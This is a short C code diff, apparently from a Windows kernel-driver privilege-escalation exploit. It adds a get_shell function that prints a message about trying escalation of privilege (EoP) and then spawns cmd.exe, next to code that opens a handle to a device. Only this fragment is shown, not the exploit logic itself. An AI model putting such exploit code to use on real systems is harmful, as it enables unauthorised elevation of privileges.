@@ -37,6 +37,13 @@ void hexdump(const void* data, size_t size)
     }
 }
 
+void get_shell(){
+    printf("[*] shellcode...Try to EoP");
+    Sleep(7);
+    system("cmd.exe");
+    return;
+}
+
 int main(){
 
     HANDLE hDevice = CreateFileW(DeviceName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
